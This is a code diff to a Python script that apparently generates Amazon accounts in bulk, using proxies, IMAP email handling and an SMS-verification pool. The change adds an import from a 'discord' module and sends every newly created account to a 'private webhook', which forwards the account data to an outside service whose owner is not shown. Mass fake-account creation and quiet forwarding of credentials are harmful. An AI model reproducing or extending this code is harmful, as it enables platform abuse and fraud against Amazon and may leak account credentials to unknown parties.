@@ -5,9 +5,11 @@ from typing import Optional
 
 import requests
 
+from discord import *
 from amazon.amazonAccount import generate_account, load_all_accounts
 from amazon.amazonImap import AmazonEmailManager
 from amazon.amazonSms import AmazonSmsManagerPool
+from discord.gen import send_private_webhook_gen
 from utils.config import load_config
 from utils.title import print_title
 
@@ -208,7 +210,9 @@ def worker(
             return
 
         try:
-            generate_account(email, password, proxy, imap_manager, sms_manager)
+            account = generate_account(email, password, proxy, imap_manager, sms_manager)
+            if account:
+                send_private_webhook_gen(account)
         finally:
             # Always mark as done to avoid blocking the queue in case of errors.
             email_queue.task_done()
